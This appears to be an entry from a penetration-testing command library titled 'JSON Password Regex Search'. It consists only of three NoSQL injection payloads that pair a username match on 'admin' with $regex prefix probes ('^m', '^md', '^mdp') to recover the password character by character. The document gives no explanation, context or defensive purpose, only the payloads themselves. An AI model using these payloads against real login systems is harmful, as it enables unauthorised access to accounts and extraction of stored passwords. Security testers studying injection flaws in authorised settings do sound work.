---
id: a6f7bc4b-1eb1-4fa3-94d7-8c69f43ea6fb
name: JSON Password Regex Search
type: command
executor: bash
data: '{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}

  {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}

  {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}'
output: null
created_at: '2023-04-06T03:56:31.467167+00:00'
updated_at: '2023-04-10T20:23:02.396179+00:00'
---

# JSON Password Regex Search

```bash
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```
